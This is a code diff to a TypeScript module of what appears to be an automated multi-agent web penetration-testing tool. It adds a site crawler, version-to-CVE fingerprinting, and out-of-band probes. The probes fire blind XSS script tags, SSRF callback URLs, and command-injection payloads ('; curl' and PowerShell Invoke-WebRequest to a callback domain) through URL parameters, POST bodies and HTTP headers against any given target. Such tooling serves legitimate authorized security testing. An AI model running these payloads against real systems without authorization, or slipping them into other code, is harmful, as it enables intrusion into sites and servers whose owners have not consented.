@@ -1,5 +1,6 @@
 import net from 'net';
 import tls from 'tls';
+import { createOastToken, waitForInteraction } from './oast.js';
 
 type AgentName = 'Scout Agent' | 'Exploiter Agent' | 'Reporter Agent';
 export type PentagiLogEntry = { time: string; agent: AgentName; msg: string };
@@ -439,6 +440,91 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
     }
   } catch (e: any) {
     log('Scout Agent', `Subdomain takeover probe: CT log query failed — ${e.message}`);
+  }
+
+  // 1h. Link crawler — discover pages to broaden probe surface
+  log('Scout Agent', `Crawling ${targetUrl} for linked pages (depth 2, max 25 pages)...`);
+  const crawledUrls = new Set<string>([targetUrl]);
+  const crawlQueue: Array<{ url: string; depth: number }> = [{ url: targetUrl, depth: 0 }];
+  while (crawlQueue.length > 0 && crawledUrls.size < 25) {
+    const { url: cUrl, depth } = crawlQueue.shift()!;
+    if (depth >= 2) continue;
+    const cRes = await httpProbe(cUrl, {}, 4000);
+    if (!cRes || cRes.status !== 200) continue;
+    const links = [...cRes.body.matchAll(/href=["']([^"'#?]+)["']/gi)]
+      .map(m => { try { return new URL(m[1], cUrl).href; } catch { return null; } })
+      .filter((l): l is string => l !== null && l.startsWith(origin) && !crawledUrls.has(l));
+    for (const link of [...new Set(links)].slice(0, 8)) {
+      crawledUrls.add(link);
+      crawlQueue.push({ url: link, depth: depth + 1 });
+    }
+  }
+  const crawledPages = [...crawledUrls].filter(u => u !== targetUrl);
+  if (crawledPages.length > 0) {
+    log('Scout Agent', `Crawler found ${crawledPages.length} additional pages: ${crawledPages.slice(0, 4).map(u => new URL(u).pathname).join(', ')}${crawledPages.length > 4 ? '...' : ''}`);
+  } else {
+    log('Scout Agent', 'Crawler: no additional same-origin pages found from homepage links');
+  }
+
+  // 1i. Technology fingerprinting + CVE detection
+  log('Scout Agent', 'Fingerprinting technology stack from HTTP headers and page content...');
+  const fpRes = await httpProbe(targetUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } });
+  if (fpRes) {
+    const serverH = fpRes.headers['server'] || '';
+    const poweredBy = fpRes.headers['x-powered-by'] || '';
+    const body = fpRes.body;
+
+    interface CveEntry { pattern: RegExp; cve: string; desc: string; severity: FindingEntry['severity'] }
+    const TECH_CVE_MAP: Array<{ name: string; detect: RegExp; source: string; cves?: CveEntry[] }> = [
+      { name: 'Apache', source: serverH, detect: /Apache\//i, cves: [
+        { pattern: /Apache\/2\.4\.4[89]\b/i, cve: 'CVE-2021-41773', desc: 'Path traversal + unauthenticated RCE', severity: 'critical' },
+        { pattern: /Apache\/2\.4\.50\b/i, cve: 'CVE-2021-42013', desc: 'Path traversal RCE (41773 bypass)', severity: 'critical' },
+        { pattern: /Apache\/2\.4\.(1[0-9]|2[0-9]|3\d|4[01234567])\b/i, cve: 'CVE-2022-31813', desc: 'mod_proxy header forwarding bypass', severity: 'high' },
+      ]},
+      { name: 'nginx', source: serverH, detect: /nginx\//i, cves: [
+        { pattern: /nginx\/1\.(1[0-3])\./i, cve: 'CVE-2019-9511', desc: 'HTTP/2 DoS via window size manipulation', severity: 'high' },
+        { pattern: /nginx\/0\./i, cve: 'CVE-legacy', desc: 'nginx 0.x — end-of-life, multiple critical CVEs', severity: 'critical' },
+      ]},
+      { name: 'PHP', source: poweredBy, detect: /PHP\//i, cves: [
+        { pattern: /PHP\/[45]\./i, cve: 'CVE-EOL', desc: 'PHP 5/4 end-of-life — hundreds of unpatched CVEs', severity: 'critical' },
+        { pattern: /PHP\/7\.[012]\./i, cve: 'CVE-EOL', desc: 'PHP 7.0-7.2 end-of-life — no security updates', severity: 'high' },
+        { pattern: /PHP\/8\.0\.\d\b/i, cve: 'CVE-2023-3824', desc: 'PHP 8.0 heap buffer overflow in PHAR', severity: 'high' },
+      ]},
+      { name: 'IIS', source: serverH, detect: /Microsoft-IIS\//i, cves: [
+        { pattern: /Microsoft-IIS\/10\.0/i, cve: 'CVE-2021-31166', desc: 'HTTP protocol stack RCE in IIS 10', severity: 'critical' },
+        { pattern: /Microsoft-IIS\/[0-9]\./i, cve: 'CVE-EOL', desc: 'IIS version below 10 — end-of-life', severity: 'high' },
+      ]},
+      { name: 'OpenSSL', source: serverH + ' ' + body, detect: /OpenSSL\/[12]\./i, cves: [
+        { pattern: /OpenSSL\/1\.0\.[012]/i, cve: 'CVE-EOL', desc: 'OpenSSL 1.0.x end-of-life — Heartbleed era vulnerabilities', severity: 'critical' },
+        { pattern: /OpenSSL\/1\.1\.1[a-q]\b/i, cve: 'CVE-2022-0778', desc: 'OpenSSL infinite loop in BN_mod_sqrt()', severity: 'high' },
+      ]},
+      { name: 'WordPress', source: body, detect: /wp-content|wp-includes/i },
+      { name: 'Drupal', source: body, detect: /drupal/i },
+      { name: 'Joomla', source: body, detect: /Joomla!/i },
+      { name: 'Laravel', source: poweredBy, detect: /Laravel/i },
+      { name: 'Express.js', source: poweredBy, detect: /Express/i },
+      { name: 'ASP.NET', source: poweredBy + ' ' + serverH, detect: /ASP\.NET/i },
+      { name: 'Tomcat', source: serverH, detect: /Apache-Coyote|Tomcat/i },
+    ];
+
+    const detectedTech: string[] = [];
+    for (const entry of TECH_CVE_MAP) {
+      if (!entry.detect.test(entry.source)) continue;
+      detectedTech.push(entry.name);
+      if (entry.cves) {
+        for (const { pattern, cve, desc, severity } of entry.cves) {
+          if (pattern.test(entry.source)) {
+            log('Scout Agent', `CVE match: ${cve} — ${entry.name} version is vulnerable: ${desc}`);
+            findings.push({ severity, title: `${entry.name} Vulnerable Version (${cve}): ${desc}` });
+          }
+        }
+      }
+    }
+    if (detectedTech.length > 0) {
+      log('Scout Agent', `Tech stack detected: ${detectedTech.join(', ')}`);
+    } else {
+      log('Scout Agent', 'Tech fingerprinting: no identifiable server/framework in response headers');
+    }
   }
 
   // ==========================================================
@@ -1125,6 +1211,90 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
     findings.push({ severity: 'high', title: `Backup Files Publicly Accessible: ${exposedBackups.join(', ')}` });
   } else {
     log('Exploiter Agent', 'Backup file discovery: no exposed backup or temp files found');
+  }
+
+  // 2t. OAST — Out-of-Band blind vulnerability detection (HTTP callbacks)
+  const oastDomain = process.env.OAST_DOMAIN;
+  if (oastDomain) {
+    log('Exploiter Agent', `OAST domain configured (${oastDomain}) — running out-of-band blind probes`);
+
+    // Blind XSS via injected script tag in URL params
+    const oastXssToken = createOastToken();
+    const oastXssUrl = `https://${oastDomain}/oast/${oastXssToken}`;
+    const blindXssPayload = `<script src="${oastXssUrl}"></script>`;
+    const xssParams = ['q', 'search', 'name', 'input', 'message', 'comment', 'feedback'];
+    for (const param of xssParams) {
+      await httpProbe(`${targetUrl}?${param}=${encodeURIComponent(blindXssPayload)}`, {
+        headers: { 'User-Agent': 'Mozilla/5.0' },
+      });
+    }
+    // Also try as POST body fields
+    await httpProbe(targetUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0' },
+      body: `q=${encodeURIComponent(blindXssPayload)}&comment=${encodeURIComponent(blindXssPayload)}`,
+    });
+    const xssCallbackReceived = await waitForInteraction(oastXssToken, 5000);
+    if (xssCallbackReceived) {
+      log('Exploiter Agent', `BLIND XSS CONFIRMED via OAST callback — injected <script> tag executed in victim browser and called back to ${oastDomain}`);
+      findings.push({ severity: 'critical', title: 'Blind Cross-Site Scripting (XSS) Confirmed via OAST Callback' });
+    } else {
+      log('Exploiter Agent', 'Blind XSS probe: no OAST callback received (no blind XSS detected, or site sanitises script tags)');
+    }
+
+    // Blind SSRF — inject OAST URL into URL-accepting parameters
+    const oastSsrfToken = createOastToken();
+    const oastSsrfUrl = `https://${oastDomain}/oast/${oastSsrfToken}`;
+    const ssrfParams = ['url', 'callback', 'webhook', 'redirect', 'next', 'endpoint', 'target', 'fetch'];
+    for (const param of ssrfParams) {
+      await httpProbe(`${targetUrl}?${param}=${encodeURIComponent(oastSsrfUrl)}`, {
+        headers: { 'User-Agent': 'Mozilla/5.0' },
+      });
+    }
+    // Also try JSON body
+    await httpProbe(`${targetUrl}/api/fetch`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0' },
+      body: JSON.stringify({ url: oastSsrfUrl, callback: oastSsrfUrl, webhook: oastSsrfUrl }),
+    });
+    const ssrfCallbackReceived = await waitForInteraction(oastSsrfToken, 5000);
+    if (ssrfCallbackReceived) {
+      log('Exploiter Agent', `BLIND SSRF CONFIRMED via OAST callback — server-side HTTP request reached ${oastDomain} (server made outbound call to attacker-controlled URL)`);
+      findings.push({ severity: 'critical', title: 'Blind Server-Side Request Forgery (SSRF) Confirmed via OAST Callback' });
+    } else {
+      log('Exploiter Agent', 'Blind SSRF probe: no OAST callback received (no blind SSRF via URL params)');
+    }
+
+    // Blind OS command injection via header injection (curl callback)
+    const oastCmdToken = createOastToken();
+    const oastCmdUrl = `https://${oastDomain}/oast/${oastCmdToken}`;
+    const cmdPayload = `; curl ${oastCmdUrl} #`;
+    const cmdPayloadPow = `| Invoke-WebRequest -Uri ${oastCmdUrl}`;
+    await httpProbe(targetUrl, {
+      headers: {
+        'User-Agent': `Mozilla/5.0 ${cmdPayload}`,
+        'X-Forwarded-For': `127.0.0.1${cmdPayload}`,
+        'Referer': `https://example.com/${cmdPayload}`,
+        'Accept-Language': `en-US,en${cmdPayload}`,
+        'X-Custom-IP-Authorization': `127.0.0.1${cmdPayload}`,
+      },
+    });
+    // PowerShell variant for Windows servers
+    await httpProbe(targetUrl, {
+      headers: {
+        'User-Agent': `Mozilla/5.0 ${cmdPayloadPow}`,
+        'X-Forwarded-For': `127.0.0.1 ${cmdPayloadPow}`,
+      },
+    });
+    const cmdCallbackReceived = await waitForInteraction(oastCmdToken, 5000);
+    if (cmdCallbackReceived) {
+      log('Exploiter Agent', `BLIND OS COMMAND INJECTION CONFIRMED via OAST — server executed curl/wget to ${oastDomain} from injected HTTP header value`);
+      findings.push({ severity: 'critical', title: 'Blind OS Command Injection Confirmed via OAST Callback (Header Injection)' });
+    } else {
+      log('Exploiter Agent', 'Blind command injection probe: no OAST callback (no header-based OS command injection detected)');
+    }
+  } else {
+    log('Exploiter Agent', 'OAST blind probes skipped — set OAST_DOMAIN env var to enable out-of-band blind XSS/SSRF/RCE detection');
   }
 
   // ==========================================================
